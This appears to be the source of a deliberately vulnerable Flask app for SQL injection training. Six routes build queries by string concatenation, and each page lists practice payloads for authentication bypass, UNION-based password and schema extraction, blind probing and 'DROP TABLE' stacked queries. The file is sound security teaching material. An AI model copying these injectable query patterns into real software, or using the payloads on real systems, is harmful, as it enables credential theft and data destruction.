#!/usr/bin/env python3
"""
SQL Injection Lab - VULNERABLE VERSION (for educational purposes only)

WARNING: This application is INTENTIONALLY VULNERABLE.
Never use these patterns in real applications.

Run:
    python db_init.py          # first time only
    python vulnerable_app.py

Then open http://127.0.0.1:5000
"""
from flask import Flask, request, render_template_string, g, redirect, url_for
import sqlite3
import time

app = Flask(__name__)
DB_PATH = "sqli_lab.db"

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(error):
    db = g.pop('db', None)
    if db is not None:
        db.close()

# ==================== HOME ====================
@app.route('/')
def home():
    return render_template_string('''
    <!doctype html>
    <html>
    <head><meta charset="utf-8"><title>SQLi Lab - VULNERABLE</title></head>
    <body style="font-family:monospace; max-width:900px; margin:40px auto; line-height:1.6">
        <h1>🔓 SQL Injection Lab (VULNERABLE)</h1>
        <p style="color:#c00"><strong>경고: 이 앱은 의도적으로 취약합니다. 교육 목적으로만 사용하세요.</strong></p>
        
        <h2>실습 메뉴</h2>
        <ul>
            <li><a href="/login">1. 로그인 (인증 우회)</a> - Classic SQLi</li>
            <li><a href="/search">2. 상품 검색 (UNION 기반 데이터 추출)</a></li>
            <li><a href="/user?id=1">3. 사용자 정보 (Boolean Blind + Error)</a></li>
            <li><a href="/profile?id=1">4. 프로필 (Time-based Blind)</a></li>
            <li><a href="/comment">5. 댓글 작성 (Second Order SQLi)</a></li>
            <li><a href="/admin">6. 관리자 페이지 (Stacked Queries)</a></li>
        </ul>

        <h2>도움말</h2>
        <ul>
            <li>DB 초기화: <code>python db_init.py</code></li>
            <li>Secure 버전 비교: <a href="http://127.0.0.1:5001">http://127.0.0.1:5001</a> (secure_app.py 실행 필요)</li>
            <li>자세한 설명은 상위 폴더의 README.md 참조</li>
        </ul>

        <p><a href="/debug">디버그: 현재 DB 상태 보기</a></p>
    </body>
    </html>
    ''')

# ==================== 1. LOGIN (Classic Auth Bypass) ====================
@app.route('/login', methods=['GET', 'POST'])
def login():
    result = ""
    executed_query = ""
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')

        # VULNERABLE: String concatenation
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        executed_query = query

        db = get_db()
        try:
            cur = db.execute(query)  # <-- SQL INJECTION HERE
            user = cur.fetchone()
            if user:
                result = f"<h3 style='color:green'>로그인 성공!</h3>" \
                         f"<p>Welcome, <strong>{user['username']}</strong> (role: {user['role']})</p>" \
                         f"<p>Secret Note: {user['secret_note']}</p>"
            else:
                result = "<h3 style='color:red'>로그인 실패</h3><p>아이디 또는 비밀번호가 틀렸습니다.</p>"
        except Exception as e:
            result = f"<pre style='color:red'>Error: {e}</pre>"

    return render_template_string('''
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Login - SQLi Lab</title></head>
    <body style="font-family:monospace; max-width:800px; margin:40px auto">
        <h1>1. 로그인 폼 (Classic SQL Injection)</h1>
        <p>이 폼은 <strong>문자열 연결</strong>로 쿼리를 만듭니다. 입력값이 직접 쿼리에 들어갑니다.</p>
        
        <form method="post" style="background:#f8f8f8; padding:20px; border:1px solid #ccc">
            <p>Username: <input type="text" name="username" size="30" value="{{ request.form.get('username','') }}"></p>
            <p>Password: <input type="text" name="password" size="30" value="{{ request.form.get('password','') }}"></p>
            <p><input type="submit" value="Login"></p>
        </form>

        {% if executed_query %}
        <h3>실행된 쿼리 (공격자가 볼 수 있는 정보):</h3>
        <pre style="background:#222;color:#0f0;padding:10px">{{ executed_query }}</pre>
        {% endif %}

        {% if result %}{{ result|safe }}{% endif %}

        <h3>시도해볼 페이로드 (Payloads)</h3>
        <ul>
            <li><code>admin' -- </code> (비밀번호 무시)</li>
            <li><code>admin' OR '1'='1' -- </code> (인증 우회)</li>
            <li><code>' OR 1=1 -- </code></li>
            <li><code>admin' OR '1'='1' /*</code></li>
            <li><code>crehacktive' AND password LIKE 'P%' -- </code> (부분 일치)</li>
        </ul>

        <p><a href="/">← 홈으로</a></p>
    </body></html>
    ''', executed_query=executed_query, result=result)

# ==================== 2. SEARCH (UNION-based) ====================
@app.route('/search')
def search():
    keyword = request.args.get('q', '')
    result_html = ""
    executed_query = ""

    if keyword:
        # VULNERABLE
        query = f"SELECT id, name, price, description FROM products WHERE name LIKE '%{keyword}%' OR description LIKE '%{keyword}%'"
        executed_query = query

        db = get_db()
        try:
            cur = db.execute(query)
            rows = cur.fetchall()

            if rows:
                result_html = "<h3>검색 결과</h3><table border=1 cellpadding=8><tr><th>ID</th><th>Name</th><th>Price</th><th>Description</th></tr>"
                for r in rows:
                    result_html += f"<tr><td>{r['id']}</td><td>{r['name']}</td><td>{r['price']}</td><td>{r['description']}</td></tr>"
                result_html += "</table>"
            else:
                result_html = "<p>검색 결과가 없습니다.</p>"
        except Exception as e:
            result_html = f"<pre style='color:red'>Error: {e}</pre>"

    return render_template_string('''
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Search - SQLi Lab</title></head>
    <body style="font-family:monospace; max-width:900px; margin:40px auto">
        <h1>2. 상품 검색 (UNION SQL Injection)</h1>
        <p>LIKE 검색이 취약합니다. UNION으로 다른 테이블 데이터를 끌어올 수 있습니다.</p>

        <form method="get">
            검색어: <input type="text" name="q" size="40" value="{{ keyword }}">
            <input type="submit" value="검색">
        </form>

        {% if executed_query %}
        <h3>실행된 쿼리:</h3>
        <pre style="background:#222;color:#0f0;padding:10px">{{ executed_query }}</pre>
        {% endif %}

        {{ result_html|safe }}

        <h3>연습 페이로드</h3>
        <p>컬럼 수 맞추기 (현재 SELECT는 4개 컬럼):</p>
        <ul>
            <li><code>%' UNION SELECT 1, username, password, email FROM users -- </code></li>
            <li><code>%' UNION SELECT id, username, password, role FROM users -- </code></li>
            <li><code>%' UNION SELECT NULL, sqlite_version(), NULL, NULL -- </code> (SQLite 버전 확인)</li>
            <li><code>%' UNION SELECT 1, name, sql, 1 FROM sqlite_master WHERE type='table' -- </code> (스키마 덤프)</li>
        </ul>

        <p><strong>팁:</strong> ORDER BY 1,2,3,4 로 컬럼 수를 알아낼 수 있습니다. (에러가 안 날 때까지 숫자 늘리기)</p>

        <p><a href="/">← 홈으로</a></p>
    </body></html>
    ''', keyword=keyword, executed_query=executed_query, result_html=result_html)

# ==================== 3. USER DETAIL (Boolean Blind + Error) ====================
@app.route('/user')
def user_detail():
    user_id = request.args.get('id', '1')
    result = ""
    executed_query = ""

    # VULNERABLE
    query = f"SELECT id, username, email, role, secret_note FROM users WHERE id = {user_id}"
    executed_query = query

    db = get_db()
    try:
        cur = db.execute(query)
        row = cur.fetchone()
        if row:
            result = f"""
            <h3>User Found</h3>
            <ul>
                <li>ID: {row['id']}</li>
                <li>Username: {row['username']}</li>
                <li>Email: {row['email']}</li>
                <li>Role: {row['role']}</li>
                <li>Secret: {row['secret_note']}</li>
            </ul>
            """
        else:
            result = "<p>User not found.</p>"
    except Exception as e:
        result = f"<pre style='color:red'>SQL Error: {e}</pre>"

    return render_template_string('''
    <!doctype html>
    <html><head><meta charset="utf-8"><title>User - SQLi Lab</title></head>
    <body style="font-family:monospace; max-width:800px; margin:40px auto">
        <h1>3. 사용자 상세 (Boolean-based Blind SQLi + Error-based)</h1>
        <p><code>?id=1</code> 형태로 접근. <strong>id 파라미터에 직접 숫자가 들어갑니다.</strong></p>

        <form>
            User ID: <input type="text" name="id" value="{{ user_id }}">
            <input type="submit" value="조회">
        </form>

        {% if executed_query %}
        <h3>실행된 쿼리:</h3>
        <pre style="background:#222;color:#0f0;padding:10px">{{ executed_query }}</pre>
        {% endif %}

        {{ result|safe }}

        <h3>Boolean Blind 연습</h3>
        <p>참/거짓에 따라 페이지 내용이 달라지는 점을 이용합니다.</p>
        <ul>
            <li><code>1 AND 1=1</code> → 정상 결과</li>
            <li><code>1 AND 1=2</code> → 결과 없음</li>
            <li><code>1 AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin') = 's'</code></li>
            <li><code>1 AND LENGTH((SELECT password FROM users WHERE username='admin')) > 10</code></li>
        </ul>

        <h3>Error-based (SQLite에서는 제한적)</h3>
        <p>SQLite는 MySQL처럼 쉽게 에러로 데이터를 추출하기 어렵습니다. 대신 Boolean이나 Time을 주로 사용합니다.</p>

        <p><a href="/">← 홈으로</a></p>
    </body></html>
    ''', user_id=user_id, executed_query=executed_query, result=result)

# ==================== 4. PROFILE (Time-based Blind) ====================
@app.route('/profile')
def profile():
    user_id = request.args.get('id', '1')
    result = ""
    executed_query = ""

    query = f"SELECT * FROM users WHERE id = {user_id}"
    executed_query = query

    db = get_db()
    start = time.time()
    try:
        cur = db.execute(query)
        row = cur.fetchone()
        elapsed = time.time() - start

        if row:
            result = f"<p>조회 완료 (소요시간: {elapsed:.2f}초)</p><p>Username: {row['username']}</p>"
        else:
            result = "<p>사용자 없음</p>"
    except Exception as e:
        result = f"Error: {e}"

    return render_template_string('''
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Profile - SQLi Lab</title></head>
    <body style="font-family:monospace; max-width:800px; margin:40px auto">
        <h1>4. 프로필 조회 (Time-based Blind SQLi)</h1>
        <p>쿼리 실행 시간을 측정하여 참/거짓을 판단합니다.</p>

        <form>
            ID: <input type="text" name="id" value="{{ user_id }}">
            <input type="submit" value="조회">
        </form>

        <pre style="background:#222;color:#0f0;padding:10px">{{ executed_query }}</pre>
        {{ result|safe }}

        <h3>Time-based 페이로드 (SQLite)</h3>
        <ul>
            <li><code>1 AND (SELECT CASE WHEN (username='admin') THEN randomblob(100000000) ELSE 0 END FROM users WHERE id=1) -- </code> (느린 응답 유발)</li>
            <li>더 나은 방법: <code>1 AND (SELECT (hex(randomblob(2000000))) FROM users WHERE username='admin' AND substr(password,1,1)='s') -- </code></li>
        </ul>
        <p><strong>참고:</strong> 실제 MySQL 환경에서는 <code>SLEEP(3)</code> 또는 <code>BENCHMARK()</code>를 사용합니다.</p>

        <p><a href="/">← 홈으로</a></p>
    </body></html>
    ''', user_id=user_id, executed_query=executed_query, result=result)

# ==================== 5. COMMENT (Second Order) ====================
@app.route('/comment', methods=['GET', 'POST'])
def comment():
    msg = ""
    if request.method == 'POST':
        author = request.form.get('author', 'anonymous')
        content = request.form.get('content', '')

        db = get_db()
        # VULNERABLE insert
        db.execute(f"INSERT INTO comments (author, content) VALUES ('{author}', '{content}')")
        db.commit()
        msg = "댓글이 등록되었습니다. (Second Order 공격을 위해 저장됨)"

    # Display comments - this is where second-order payload executes if we had vulnerable display
    db = get_db()
    comments = db.execute("SELECT * FROM comments ORDER BY id DESC").fetchall()

    comments_html = ""
    for c in comments:
        comments_html += f"<li><b>{c['author']}</b>: {c['content']}</li>"

    return render_template_string('''
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Comments - SQLi Lab</title></head>
    <body style="font-family:monospace; max-width:800px; margin:40px auto">
        <h1>5. 댓글 시스템 (Second Order SQL Injection)</h1>
        <p>댓글을 저장할 때는 취약하지 않지만, <strong>나중에 다른 곳에서 이 값을 사용할 때</strong> 공격이 발동합니다.</p>

        <form method="post" style="background:#f0f0f0;padding:15px">
            작성자: <input type="text" name="author" value="hacker"><br><br>
            내용: <br><textarea name="content" rows="3" cols="60"></textarea><br><br>
            <input type="submit" value="댓글 등록">
        </form>

        <p style="color:green">{{ msg }}</p>

        <h3>저장된 댓글들 (이 댓글들이 다른 쿼리에 들어갈 수 있음)</h3>
        <ul>{{ comments_html|safe }}</ul>

        <h3>Second Order 예시 페이로드</h3>
        <p>내용에 아래를 입력한 후, 나중에 /search 또는 다른 취약 지점에서 이 값을 사용하게 만들면 공격 성공:</p>
        <pre>'); DROP TABLE users; --</pre>
        <p>또는 UNION 페이로드를 저장해두고 나중에 관리자 페이지에서 출력될 때 실행.</p>

        <p><a href="/">← 홈으로</a></p>
    </body></html>
    ''', msg=msg, comments_html=comments_html)

# ==================== 6. ADMIN (Stacked / Dangerous) ====================
@app.route('/admin')
def admin():
    action = request.args.get('action', '')
    result = ""

    db = get_db()
    if action == 'list_users':
        # VULNERABLE - but actually using execute which can do stacked in some drivers
        query = "SELECT username, role FROM users"
        rows = db.execute(query).fetchall()
        result = "<h3>사용자 목록</h3><ul>"
        for r in rows:
            result += f"<li>{r['username']} ({r['role']})</li>"
        result += "</ul>"

    elif action == 'delete_user':
        uid = request.args.get('uid', '')
        # EXTREMELY DANGEROUS - stacked query possible in some configurations
        query = f"DELETE FROM users WHERE id = {uid}"
        try:
            db.execute(query)
            db.commit()
            result = f"<p style='color:red'>사용자 {uid} 삭제 시도됨 (쿼리: {query})</p>"
        except Exception as e:
            result = f"Error: {e}"

    return render_template_string('''
    <!doctype html>
    <html><head><meta charset="utf-8"><title>Admin - SQLi Lab</title></head>
    <body style="font-family:monospace; max-width:800px; margin:40px auto">
        <h1>6. 관리자 기능 (Stacked Queries / Dangerous Actions)</h1>
        <p style="color:#c00">이 페이지는 실제로 위험한 작업을 수행할 수 있습니다.</p>

        <p><a href="?action=list_users">사용자 목록 보기</a></p>
        <p>
            사용자 삭제 테스트:
            <a href="?action=delete_user&uid=3">uid=3 삭제 시도</a>
            (실제로는 guest 계정)
        </p>

        {{ result|safe }}

        <h3>Stacked Query 페이로드 예시 (SQLite는 제한적)</h3>
        <p>SQLite에서는 한 execute()에서 여러 문장을 실행하기 어렵습니다. MySQL에서는 <code>; DROP TABLE ...</code> 가 가능합니다.</p>
        <pre>?uid=1; DROP TABLE users; --</pre>

        <p><a href="/">← 홈으로</a></p>
    </body></html>
    ''', result=result)

# ==================== DEBUG ====================
@app.route('/debug')
def debug():
    db = get_db()
    users = db.execute("SELECT id, username, role, secret_note FROM users").fetchall()
    products = db.execute("SELECT * FROM products").fetchall()

    u_html = "".join([f"<tr><td>{u['id']}</td><td>{u['username']}</td><td>{u['role']}</td><td>{u['secret_note']}</td></tr>" for u in users])
    p_html = "".join([f"<tr><td>{p['id']}</td><td>{p['name']}</td><td>{p['price']}</td></tr>" for p in products])

    return f'''
    <h1>Debug - Current Database</h1>
    <h2>Users</h2>
    <table border="1" cellpadding="6"><tr><th>id</th><th>username</th><th>role</th><th>secret_note</th></tr>{u_html}</table>
    <h2>Products</h2>
    <table border="1" cellpadding="6"><tr><th>id</th><th>name</th><th>price</th></tr>{p_html}</table>
    <p><a href="/">홈으로</a></p>
    '''

if __name__ == '__main__':
    print("[*] Starting VULNERABLE SQL Injection Lab on http://127.0.0.1:5000")
    print("[*] Make sure you ran: python db_init.py")
    app.run(debug=True, port=5000)